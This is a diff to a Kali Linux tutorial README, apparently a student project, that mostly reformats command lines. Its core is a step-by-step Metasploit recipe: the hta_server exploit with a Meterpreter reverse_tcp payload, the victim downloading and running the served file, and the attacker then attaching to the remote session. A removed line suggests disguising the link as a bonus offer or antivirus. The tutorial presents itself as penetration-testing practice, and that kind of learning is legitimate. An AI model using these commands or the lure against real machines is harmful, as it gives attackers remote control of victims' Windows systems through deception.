@@ -112,8 +112,8 @@ Once you receive the message Installation is complete, click Continue to reboot 
 ## Open kali linux terminal
 
 --->>> update your kali linux using the command:
-#apt-get update
-#apt-get upgrade
+```$ apt-get update```
+```$ apt-get upgrade```
 
 --->>> log the system to attack tape:
 #msfconsole
@@ -123,46 +123,46 @@ Once you receive the message Installation is complete, click Continue to reboot 
 
 --->>> when you are in the console tape
 
-#use exploit/windows/misc/hta_server
+```$ use exploit/windows/misc/hta_server```
 
 --->>> open a new terminal to find your IP address and tape
 
-#ifconfig
+```$ ifconfig```
 
-#set lhost "your Ip address"
-#set srvhost "your Ip address"
+```$ set lhost "your Ip address"```
+```$ set srvhost "your Ip address"```
 
 --->>>set payload following comand
 
-#set payload windows/meterpreter/reverse_tcp
-#set lport 8111 
+```$ set payload windows/meterpreter/reverse_tcp```
+```$ set lport 8111```
 
 --->>>tape exploit
-#exploit
+```$ exploit```
 
 --->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 
 
 --->>>to connect over the sessions 
 
-#sessions -i 1
+```$ sessions -i 1```
 
 ### second method
 
 --->>> when you are in the console tape
 
-'''$ use windows/misc/hta_server'''
+```$ use windows/misc/hta_server```
 
-#set uripath /name it like (get$5bonus) or (antivirus) etc....
+```$ set uripath /name it```
 
 --->>>tape exploit
 
-#exploit
+```$ exploit```
 
 --->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 
 
 --->>>to connect over the sessions 
 
-#sessions -i 1
+```$ sessions -i 1```
 
 
 ### We used the second method for the demo
@@ -171,7 +171,7 @@ https://user-images.githubusercontent.com/90642756/143676387-923a100d-630e-474c-
 
 # FINAL REVIEW :
 
-Kali Linux is definitely a best Linux distro for someone who want to learn and improve their skills in Penetration testing, Metasploit, the most famous tool amoung the security researchers, comes inbuilt with Kali Linux. Other famous and great tools includes wireshark etc. . its easy to use if you have used any of the Linux distro like Ubuntu in your school.
+Kali Linux is definitely a best Linux distro for someone who want to learn and improve their skills in Penetration testing, Metasploit, the most famous tool amoung the security researchers, comes inbuilt with Kali Linux. Other famous and great tools includes wireshark etc. Its easy to use if you have used any of the Linux distro like Ubuntu in your school.
 # What we learned about kali linux 
 
 Kali Linux is a security distribution of Linux derived from Debian and specifically designed for computer forensics and advanced penetration testing. Kali Linux has over 600 preinstalled penetration-testing applications to discover. Each program with its unique flexibility and use case.
